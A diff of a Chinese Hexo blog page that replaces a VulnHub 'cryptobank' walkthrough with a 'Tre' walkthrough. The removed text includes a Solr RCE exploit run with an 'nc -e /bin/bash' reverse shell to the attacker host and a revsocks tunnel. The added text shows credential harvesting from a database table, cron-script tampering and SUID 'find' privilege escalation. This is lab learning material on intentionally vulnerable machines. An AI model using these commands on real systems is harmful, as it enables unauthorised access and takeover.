@@ -4,17 +4,15 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="cryptobank, Web h**k Python aling">
+    <meta name="keywords" content="Tre, Web h**k Python aling">
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48">
     <meta name="360-site-verification" content="b7c11a830ef90fd1464ad6206bb7b6e7">
-    <meta name="description" content="靶机ip：192.168.232.152
-kali ip：192.168.232.153
+    <meta name="description" content="
+  nmap 
 
-  nmap 扫描
-
-kali@kali:~$ nmap -sV 192.168.232.152
-Starting Nmap 7.80 ( http">
+kali@kali:~$ nmap -p1-65535 -sV 192.168.232.156
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-17 05:16 ED">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -22,7 +20,7 @@ Starting Nmap 7.80 ( http">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>cryptobank | 道士信佛</title>
+    <title>Tre | 道士信佛</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -302,13 +300,13 @@ Starting Nmap 7.80 ( http">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        cryptobank
+                        Tre
                     </div>
                 </div>
             </div>
@@ -443,7 +441,7 @@ Starting Nmap 7.80 ( http">
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-06-06
+                    2020-06-17
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -457,14 +455,14 @@ Starting Nmap 7.80 ( http">
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1k
+                    491
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    2 分
                 </div>
                 
                 
@@ -475,145 +473,76 @@ Starting Nmap 7.80 ( http">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>靶机ip：192.168.232.152</p>
-<p>kali ip：192.168.232.153</p>
-<blockquote>
-<p>  nmap 扫描</p>
+                <blockquote>
+<p>  nmap </p>
 </blockquote>
-<pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ nmap -sV 192.168.232.152
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-05 22:56 EDT
-Nmap scan report for bogon (192.168.232.152)
-Host is up (0.00039s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+<pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ nmap -p1-65535 -sV 192.168.232.156
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-17 05:16 EDT
+Nmap scan report for bogon (192.168.232.156)
+Host is up (0.00042s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
+8082/tcp open  http    nginx 1.14.2
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 6.90 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+Nmap done: 1 IP address (1 host up) scanned in 10.73 seconds
+kali@kali:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>80 和 8082 两个端口呈现一样的内容</p>
+<p><img src="image-20200617171807595.png" alt></p>
 <blockquote>
-<p>  dirb 目录探测</p>
+<p>  dirb 所扫描目录</p>
 </blockquote>
-<pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ dirb http://192.168.232.152/
+<pre class="line-numbers language-shell"><code class="language-shell">dirb http://192.168.232.156/ /usr/share/dirb/wordlists/big.txt <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="image-20200617172515530.png" alt></p>
+<p><img src="image-20200617172609404.png" alt></p>
+<p><img src="image-20200617172628731.png" alt></p>
+<p>在扫一下网站找找登陆页面</p>
+<p><img src="image-20200617172936104.png" alt></p>
+<p>访问并登陆</p>
+<p><img src="image-20200617173100239.png" alt></p>
+<p>查看 <code>mantis_user_table</code> 表的内容</p>
+<p><img src="image-20200617173221641.png" alt> </p>
+<p>看着 username:realname 就像是 user:passwd</p>
+<p>其实我开始的思路是把 tre 用户的 password 字段换了，登陆后台，确实有个后台可以进去，但我发现不会getshell</p>
+<p><img src="1.JPG" alt></p>
+<p>用得到了用户名和密码登陆 ssh</p>
+<pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ ssh tre@192.168.232.156
+tre@192.168.232.156's password: 
+Linux tre 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64
 
-==> DIRECTORY: http://192.168.232.152/assets/                                             
-+ http://192.168.232.152/development (CODE:401|SIZE:462)                                 
-+ http://192.168.232.152/index.html (CODE:200|SIZE:33527)                                 
-+ http://192.168.232.152/info.php (CODE:200|SIZE:86257)                                  
-+ http://192.168.232.152/server-status (CODE:403|SIZE:280)                               
-==> DIRECTORY: http://192.168.232.152/trade/                                             
----- Entering directory: http://192.168.232.152/assets/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
----- Entering directory: http://192.168.232.152/trade/ ----
-+ http://192.168.232.152/trade/index.php (CODE:200|SIZE:2447) <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>info.php 为网站配置，/trade/index.php 存在sql注入</p>
-<blockquote>
-<p>  sqlmap 执行注入</p>
-</blockquote>
-<pre class="line-numbers language-shell"><code class="language-shell"># 得到一堆姐结果 随便找一个账户进入登陆页面，进去后发现没啥用！
-# juliusthedeveloper:wJWm4CgV26 这条记录值得注意<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>根据 dirb 扫描结果有一个返回状态码 401 的目录 development/ </p>
-<p><img src="image-20200606111051273.png" alt></p>
-<p>输入上述密码，不能通过验证</p>
-<p>在主页找到开发者板块，发现各个邮箱图标对应的url包含的文件名可能为开发者用户名</p>
-<p><img src="image-20200606111513077.png" alt></p>
-<p><img src="image-20200606111547218.png" alt></p>
-<pre class="line-numbers language-shell"><code class="language-shell"># julius.b:wJWm4CgV26 这条记录可以通过验证<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>默认页面没有什么东西</p>
-<p><img src="image-20200606111801008.png" alt></p>
-<blockquote>
-<p>  dirb 对 development 目录进行扫描</p>
-</blockquote>
-<pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ dirb http://192.168.232.152/development -u julius.b:wJWm4CgV26
------------------
-DIRB v2.22    
-By The Dark Raver
------------------
-START_TIME: Sat Jun  6 01:35:04 2020
-URL_BASE: http://192.168.232.152/development/
-WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-AUTHORIZATION: julius.b:wJWm4CgV26
------------------
-GENERATED WORDS: 4612                                                     
----- Scanning URL: http://192.168.232.152/development/ ----
-==> DIRECTORY: http://192.168.232.152/development/backups/                               
-+ http://192.168.232.152/development/index.html (CODE:200|SIZE:21)                       
-+ http://192.168.232.152/development/php.ini (CODE:200|SIZE:109)                         
-==> DIRECTORY: http://192.168.232.152/development/tools/                   
----- Entering directory: http://192.168.232.152/development/backups/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)  
----- Entering directory: http://192.168.232.152/development/tools/ ----
-+ http://192.168.232.152/development/tools/index.php (CODE:403|SIZE:690)   
-==> DIRECTORY: http://192.168.232.152/development/tools/Resources/         
----- Entering directory: http://192.168.232.152/development/tools/Resources/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                   
-    (Use mode '-w' if you want to scan it anyway)
------------------
-END_TIME: Sat Jun  6 01:35:18 2020
-DOWNLOADED: 9224 - FOUND: 3
-kali@kali:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>访问  <code>http://192.168.232.152/development/tools/</code></p>
-<p><img src="image-20200606133701657.png" alt></p>
-<p>看到一个文件上传，试了很久没成功，看大佬的做法，有一个文件包含结合phpinfo可以搞</p>
-<p><img src="image-20200606133931828.png" alt></p>
-<p>找相关脚本，并修改相关内容</p>
-<p><img src="image-20200606134237623.png" alt></p>
-<p><img src="image-20200606134120527.png" alt></p>
-<p>执行脚本，拿到shell</p>
-<p><img src="image-20200606134707323.png" alt></p>
-<blockquote>
-<p>  提权</p>
-</blockquote>
-<p>查看网卡，发现一个docker网卡</p>
-<p><img src="image-20200606135002535.png" alt></p>
-<p>尝试寻找docker开启了哪些容器，是否暴露了哪些端口</p>
-<p><img src="image-20200606135336840.png" alt></p>
-<p>172.17.0.1这也是一个内外ip，这应该是docker开启的一个容器，8983是solr的端口，没法直接访问，利用 revsocks 将它代理出来看看</p>
-<pre class="line-numbers language-shell"><code class="language-shell"># ./revsocks_linux_amd64 -listen :8089 -socks 0.0.0.0:16671 -pass cryptobank 监听端
-# ./revsocks_linux_amd64 -connect 192.168.232.153:8089 -pass cryptobank 靶机执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>浏览器访问（先设置代理端口）</p>
-<p><img src="image-20200606145803512.png" alt></p>
-<blockquote>
-<p>  利用 solr 提权</p>
-</blockquote>
-<pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ searchsploit solr
------------------------------------------------------------ ---------------------------------
- Exploit Title                                             |  Path
------------------------------------------------------------ ---------------------------------
-Apache Solr - Remote Code Execution via Velocity Template  | multiple/remote/48338.rb
-Apache Solr 7.0.1 - XML External Entity Expansion / Remote | xml/webapps/43009.txt
-Apache Solr 8.2.0 - Remote Code Execution                  | java/webapps/47572.py
-Solr 3.5.0 - Arbitrary Data Deletion                       | java/webapps/39418.txt
------------------------------------------------------------ ---------------------------------
-Shellcodes: No Results
-kali@kali:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ proxychains python3 47572.py 172.17.0.1 8983 "nc -e /bin/bash 192.168.232.153 6685"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ nc -lvp 6685
-listening on [any] 6685 ...
-Warning: forward host lookup failed for bogon: No address associated with name
-connect to [192.168.232.153] from bogon [192.168.232.152] 33714
-pwd
-/opt/solr/server
-python -c 'import pty;pty.spawn("/bin/bash")'
-solr@33fa86e6105f:/opt/solr/server$ 
-solr@33fa86e6105f:/opt/solr/server$ cd /
-cd /
-solr@33fa86e6105f:/$ ls
-ls
-bin   docker-entrypoint-initdb.d  lib    mnt   root  srv  usr
-boot  etc                         lib64  opt   run   sys  var
-dev   home                        media  proc  sbin  tmp
-solr@33fa86e6105f:/$ sudo su root
-sudo su root
-[sudo] password for solr: solr
-root@33fa86e6105f:/# id
-id
-uid=0(root) gid=0(root) groups=0(root)
-root@33fa86e6105f:/# <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>确实也拿到了，root下的flag，但是是在docker容器内部的root，怎么拿下宿主机的root，还不会……</p>
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Jun 17 05:01:38 2020 from 192.168.232.153
+tre@tre:~$ 
+tre@tre:~$ sudo -l
+Matching Defaults entries for tre on tre:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User tre may run the following commands on tre:
+    (ALL) NOPASSWD: /sbin/shutdown
+tre@tre:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可以执行 shutdown 是不是机器重启会启动什么服务之类的，而这类服务貌似权限都挺高</p>
+<p>传一个 pspy64 上去</p>
+<p><img src="image-20200617173942709.png" alt></p>
+<p> root 每秒钟都会执行一次 check-system ，加两个语句进去看会不被执行</p>
+<p><img src="image-20200617174104097.png" alt></p>
+<p>修改后查看 find 和 ip 的权限没有改变，想到 linux 有个特点重启生效~</p>
+<p><img src="image-20200617174438968.png" alt></p>
+<p>看到 find 就有 suid 权限了</p>
+<pre class="line-numbers language-shell"><code class="language-shell">tre@tre:~$ 
+tre@tre:~$ find . -exec /bin/bash -p \; -quit
+bash-5.0# 
+bash-5.0# whoami
+root
+bash-5.0# <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
             </div>
             <hr />
@@ -772,9 +701,9 @@ root@33fa86e6105f:/# <span aria-hidden="true" class="line-numbers-rows"><span></
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《cryptobank》
+                    《Tre》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/06/06/vulnhub-cryptobank/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/06/17/tre/" property="cc:attributionName"
                rel="cc:attributionURL">
                 ALing
             </a> 采用
@@ -1076,29 +1005,30 @@ root@33fa86e6105f:/# <span aria-hidden="true" class="line-numbers-rows"><span></
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/06/09/hexothebox-ctf-web/">
+                <a href="/2020/06/17/tre/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="【加密】hexothebox-ctf-web">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="Tre">
                         
-                        <span class="card-title">【加密】hexothebox-ctf-web</span>
+                        <span class="card-title">Tre</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            Fuzzy,Emdee five for life,
+                            dirb扫描、pspy64提权
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-06-09
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-06-17
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -1111,15 +1041,12 @@ root@33fa86e6105f:/# <span aria-hidden="true" class="line-numbers-rows"><span></
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/CTF/" target="_blank">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
-                    <a href="/tags/hackTheBox/" target="_blank">
-                        <span class="chip bg-color">hackTheBox</span>
+                    <a href="/tags/vulnhub/" target="_blank">
+                        <span class="chip bg-color">vulnhub</span>
                     </a>
                     
                 </div>
@@ -1133,24 +1060,24 @@ root@33fa86e6105f:/# <span aria-hidden="true" class="line-numbers-rows"><span></
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/05/30/vulnhub-typo/">
+                <a href="/2020/06/13/geisha/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="Typo">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="Geisha">
                         
-                        <span class="card-title">Typo</span>
+                        <span class="card-title">Geisha</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            目录扫描、phpmyadmin弱口令、typo3拿shell、apache2-restart提权
+                            端口扫描、ssh爆破、base32读shadow、密钥登陆ssh
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-05-30
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-06-13
                             </span>
                         <span class="publish-author">
                             
@@ -1314,6 +1241,25 @@ root@33fa86e6105f:/# <span aria-hidden="true" class="line-numbers-rows"><span></
     
 
 </main>
+
+
+<script src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+    MathJax.Hub.Config({
+        tex2jax: {inlineMath: [['$', '$'], ['\(', '\)']]}
+    });
+</script>
+
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
 
 
     <footer class="page-footer bg-color">
